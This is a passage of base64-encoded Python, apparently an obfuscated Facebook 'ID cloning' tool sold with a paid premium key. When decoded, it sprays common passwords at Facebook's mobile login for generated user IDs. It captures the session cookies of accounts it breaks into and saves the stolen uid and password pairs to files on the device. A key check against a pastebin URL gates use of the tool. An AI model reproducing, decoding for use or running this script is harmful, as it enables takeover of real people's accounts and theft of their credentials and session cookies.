m1PRkZcMDMzWzE7MzRtXSBcMDMzWzE7OTdtQUlSUExBTkUgTU9ERfCfmoAiKQ0KICAgICAgICBqYWxhbigiICAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW3inJNcMDMzWzk3OzFtXSBcMDMzWzE7OTdtTUlYIElEWiBDTE9OSU5HIEVOSk9ZIERFQVIgVVNFUiDinJQiKQ0KICAgICAgICBwcmludCgiICAgICBcMDMzWzM4OzU7NDZtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMTszNW0tXDAzM1sxOzM0bS1cMDMzWzE7MzNtLVwwMzNbMTszMm0tXDAzM1sxOzk3bS1cMDMzWzM4OzU7MTk2bS1cMDMzWzM4OzU7NDZtLVwwMzNbMTszNW0tXDAzM1sxOzM0bS1cMDMzWzE7MzNtLVwwMzNbMTszMm0tXDAzM1sxOzk3bS1cMDMzWzM4OzU7MTk2bS1cMDMzWzM4OzU7NDZtLVwwMzNbMTszMm0tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTs5N20tXDAzM1sxOzMzbS1cMDMzWzM4OzU7MTk2bS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzMzbS1cMDMzWzE7MzJtLVwwMzNbMTs5N20tXDAzM1szODs1OzE5Nm0tXDAzM1szODs1OzQ2bS1cMDMzWzM4OzU7MTk2bS1cMDMzWzE7MzJtLVwwMzNbMTs5N20tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTszM20tXDAzM1szODs1OzQ2bS1cMDMzWzE7OTdtLVwwMzNbMTszMm0tXDAzM1sxOzMzbS1cMDMzWzM4OzU7MTk2bS0iKQ0KICAgICAgICBmb3IgbG92ZSBpbiB1c2VyOg0KICAgICAgICAgICAgcHd4ID0gW2xvdmUsJyMjI0BAQCcsJ2toYW4xMjMnLCdraGFuMTIzNCcsJ2toYW4jIyMnLCdraGFuQEBAJywna2hhbkBAQCcsJ0BAQCMjIycsJzEyM0BAQCcsJzEyMyMjIycsJzY4NDgzNzMnLCcwMTg0NzQ0OCcsJ2JhbmdsYWRlc2gnLCdpIGxvdmUgeW91JywnQmFuZ2xhZGVzaCcsJ2ZyZWUgZmlyZScsJ0ZyZWUgZmlyZScsJ0kgbG92ZSB5b3UnLCdTYWtpbEAxMjMnLCdTYWtpbDEyMycsJ1Nha2lsQEBAJywnQCPgp7MlJiXgp7MjQCcsJyYl4Kez4KezJSYnLCcjQOCnsyXgp7MjQCcsJ0Aj4KezJiYmJSMnLCdA4KezJibgp7MjQCcsJzY0MyUmNCMnLCcxM0Dgp7M0IycsJzE0I0A1NCcsJ0AyNCNAMyMnLCdA4Kez4KezMiUj4KezJywnKDE0NjMjJSknLCdzYWtpbEBAQCcsJ3phcmEgZ2FtaW5nQEBAJywnc2FkaWFAQEAnLCdtYWhlZGlAMTIzJyxdDQogICAgICAgICAgICB1aWQgPSBjb2RlK2xvdmUNCiAgICAgICAgICAgIHNldHUuc3VibWl0KHJjcmFjayx1aWQscHd4LHRsKQ0KICAgIHByaW50KCdcbiAgICBDUkFDSyBQUk9DRVNTIEhBUyBCRUVOIENPTVBMRVRFRCAnKQ0KIA0KZGVmIHJjcmFjayh1aWQscHd4LHRsKToNCiAgICAjcHJpbnQodXNlcikNCiAgICBnbG9iYWwgbG9vcA0KICAgIGdsb2JhbCBjcHMNCiAgICBnbG9iYWwgb2tzDQogICAgZ2xvYmFsIHByb3h5DQogICAgdHJ5Og0KICAgICAgICBmb3IgcHMgaW4gcHd4Og0KICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuKQ0KICAgICAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgZnJlZV9mYiA9IHNlc3Npb24uZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nKS50ZXh0DQogICAgICAgICAgICBsb2dfZGF0YSA9IHsNCiAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAiamF6b2VzdCI6cmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJtX3RzIjpyZS5zZWFyY2goJ25hbWU9Im1fdHMiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgImxpIjpyZS5zZWFyY2goJ25hbWU9ImxpIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJ0cnlfbnVtYmVyIjoiMCIsDQogICAgICAgICAgICAidW5yZWNvZ25pemVkX3RyaWVzIjoiMCIsDQogICAgICAgICAgICAiZW1haWwiOnVpZCwNCiAgICAgICAgICAgICJwYXNzIjpwcywNCiAgICAgICAgICAgICJsb2dpbiI6IkxvZyBJbiJ9DQogICAgICAgICAgICBoZWFkZXJfZnJlZWZiID0geyJhdXRob3JpdHkiOiAnbWJhc2ljLmZhY2Vib29rLmNvbScsDQogICAgICAgICAgICAibWV0aG9kIjogJ0dFVCcsDQogICAgICAgICAgICAic2NoZW1lIjogJ2h0dHBzJywNCiAgICAgICAgICAgICdhY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43JywNCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjknLA0KICAgICAgICAgICAgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywNCiAgICAgICAgICAgICdkcHInOiAnMS43MDAwMDAwNDc2ODM3MTU4JywNCiAgICAgICAgICAgICdzZWMtY2gtcHJlZmVycy1jb2xvci1zY2hlbWUnOiAnZGFyaycsDQogICAgICAgICAgICAnc2VjLWNoLXVhJzogJyJOb3QtQS5CcmFuZCI7dj0iOTkiLCAiQ2hyb21pdW0iO3Y9IjEyNCInLA0KICAgICAgICAgICAgJ3NlYy1jaC11YS1mdWxsLXZlcnNpb24tbGlzdCc6ICciTm90LUEuQnJhbmQiO3Y9Ijk5LjAuMC4wIiwgIkNocm9taXVtIjt2PSIxMjQuMC42MzI3LjQiJywNCiAgICAgICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8xJywNCiAgICAgICAgICAgICdzZWMtY2gtdWEtbW9kZWwnOiAnIk1pIEEzIicsDQogICAgICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJBbmRyb2lkIicsDQogICAgICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtLXZlcnNpb24nOiAnIjExLjAuMCInLA0KICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywNCiAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXVzZXInOiAnPzEnLA0KICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsDQogICAgICAgICAgICAndXNlci1hZ2VudCc6IHByb30NCiAgICAgICAgICAgIGxvID0gc2Vzc2lvbi5wb3N0KCdodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vP3JlZnNyYycsZGF0YT1sb2dfZGF0YSxoZWFkZXJzPWhlYWRlcl9mcmVlZmIpLnRleHQNCiAgICAgICAgICAgIGxvZ19jb29raWVzPXNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLmtleXMoKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbNjU6ODBdDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMzg7NTs0Nm1bTklMT1ktT0tdICcgK3VpZCsgJ3wnICtwcysgICAgJyAgXG4gICBcMDMzWzE7MzNtQ09PS0lFUyA6IFwwMzNbMzg7NTs0Nm0nK2Nva2krICcgJykgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9OSUxPWS1YRC1PSy50eHQnLCAnYScpLndyaXRlKCB1aWQrJyB8ICcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbNjU6ODBdDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMzg7NTs0Nm1bTklMT1ktQ1BdICcgK3VpZCsgJ3wnICtwcysgJyAgXDMzWzA7OTdtJykNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL05JTE9ZLVhELUNQLnR4dCcsICdhJykud3JpdGUoIHVpZCsnIHwgJytwcysnIFxuJykNCiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBsb29wKz0xDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoJ1xyICAgIFwzM1sxOzkzbVtcMDMzWzE7OTVtTklMT1lcMDMzWzBtLyVzXDMzWzE7OTNtXVwwMzNbMTs5N21PSy1cMDMzWzM4OzU7NDZtJXMnJShsb29wLGxlbihva3MpKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KDQoNCmRlZiBTdWJzY3JhcHRpb24oKToNCglrZXkxPW9wZW4oJy9zdG9yYWdlL2VtdWxhdGVkLzAvYW5kcm9pZDgudHh0JywgJ3InKS5yZWFkKCkNCglyMT1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL002TVRkdjJuIikudGV4dA0KCWlmIGtleTEgaW4gcjE6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlvKCkNCgllbHNlOg0KCQlvcy5zeXN0ZW0oImNsZWFyIikNCgkJcHJpbnQobG9nbykNCgkJcHJpbnQoIiAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW3igKJcMDMzWzk3OzFtXVwzM1swOzkybVlPVVIgQVJFIE5PVCBBIFBSRU1JVU0gVVNFUiIpDQoJCXRpbWUuc2xlZXAoMC4wMDA5KQ0KCQlwcmludCgiICAgIFwwMzNbOTc7MW1bXDAzM1s5MjsxbeKAolwwMzNbOTc7MW1dXDMzWzA7OTJtUFJFTUlVTSBUT1BVUCBMSVNUIikNCgkJcHJpbnQoIiAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW3igKJcMDMzWzk3OzFtXVwzM1swOzkybTcgREFZUyAyMDAgVEFLQSIpDQoJCXByaW50KCIgICAgXDAzM1s5NzsxbVtcMDMzWzkyOzFt4oCiXDAzM1s5NzsxbV1cMzNbMDs5Mm0xNSBEQVlTIDQwMCBUQUtBIikNCgkJcHJpbnQoIiAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW3igKJcMDMzWzk3OzFtXVwzM1swOzkybVlvdXIgS2V5ICA6XDAzM1sxOzk0bSAiK2FrK05JTE9ZK2tleTEpDQoJCW5hbWUgPSBpbnB1dCgiICAgIFwwMzNbOTc7MW1bXDAzM1s5MjsxbeKAolwwMzNbOTc7MW1dXDMzWzA7OTJtWW91ciBOYW1lIDogIikNCgkJaW5wdXQoIiAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW3igKJcMDMzWzk3OzFtXVwzM1swOzkybVByZXNzIEVudGVyIFRvIFNlbmQgS2V5IikNCgkJdGltZS5zbGVlcCgzLjUpDQoJCXRrcyA9ICdEZWFyJTIwQWRtaW4sJTIwUGxlYXNlJTIwQXBwcm92ZWQlMjBNeSUyMEtleSUyMFRvJTIwUHJlbWl1bSUyMCUyMFRoYW5rcyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyME15JTIwTmFtZSUyMDolMjAnK25hbWUrJyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyME15JTIwJTIwS2V5JTIwJTIwOiUyMCcrYWsrTklMT1krJycra2V5MQ0KCQlvcy5zeXN0ZW0oJ2FtIHN0YXJ0IGh0dHBzOi8vd2EubWUvKzg4MDE3MjE0NzQwMTE/dGV4dD0nICsgdGtzKQ0KCQlTdWJzY3JhcHRpb24oKSANCiNTdWJzY3JhcHRpb24oKQ0Kbygp'))